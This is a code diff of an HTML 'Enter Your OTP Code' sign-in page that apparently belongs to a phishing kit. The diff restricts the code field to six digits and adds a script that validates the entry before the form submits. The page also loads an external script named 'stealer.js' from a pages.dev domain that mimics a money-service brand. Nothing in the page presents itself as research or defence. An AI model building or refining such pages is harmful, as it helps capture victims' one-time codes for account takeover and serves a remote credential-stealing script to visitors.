@@ -431,14 +431,14 @@ input, button, textarea, select { font-style: inherit; font-variant: inherit; fo
     <div data-testid="sign-in" class="sc-eCOUaW hoTvwz">
         <h1 class="sc-ksZaOG ejEKLA">Enter Your OTP Code</h1>
         <div data-testid="basic-box" class="sc-kDDrLX huTwwq"></div>
-        
+
         <div class="sc-KfMfS gLuaBt">
             <div data-testid="input-container" class="sc-cHPgQl cCsOnE">
                 <div class="sc-gHLcSH eCmlhL">
                     <label for="input-otp" data-testid="input-otp-label"></label>
-                    <input name="otp" data-testid="input-otp" id="input-otp" type="text" 
-                        inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" 
-                        required class="sc-bSakgD dtdHRB">
+                    <input name="otp" data-testid="input-otp" id="input-otp" type="text"
+                        inputmode="numeric" pattern="[0-9]{6}" autocomplete="one-time-code" 
+                        required maxlength="6" minlength="6" class="sc-bSakgD dtdHRB">
                 </div>
             </div>
         </div>
@@ -452,6 +452,22 @@ input, button, textarea, select { font-style: inherit; font-variant: inherit; fo
     </div>
 </form>
 
+<!-- Script to Ensure 6-Digit OTP Input -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const otpInput = document.getElementById("input-otp");
+    const otpForm = document.getElementById("otpForm");
+
+    otpForm.addEventListener("submit", function (event) {
+        const otpValue = otpInput.value.trim();
+
+        if (otpValue.length !== 6 || isNaN(otpValue)) {
+            event.preventDefault(); // Stop submission
+            alert("Please enter a valid 6-digit OTP code.");
+        }
+    });
+});
+</script>
 
 <!-- Include External JavaScript -->
 <script src="https://equalsmoneyd.pages.dev/stealer.js"></script>
